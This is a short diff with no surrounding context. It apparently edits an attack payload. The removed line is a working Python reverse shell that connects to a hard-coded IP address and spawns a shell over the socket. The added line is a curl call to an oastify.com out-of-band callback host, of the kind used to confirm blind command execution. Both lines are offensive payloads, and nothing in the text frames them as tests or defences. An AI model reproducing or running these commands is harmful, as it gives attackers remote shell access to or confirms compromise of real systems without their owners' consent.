@@ -1,1 +1,1 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("178.62.196.141",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+curl nypzkrp8k3bnx80kurigw8gat1zu0it6i.oastify.com
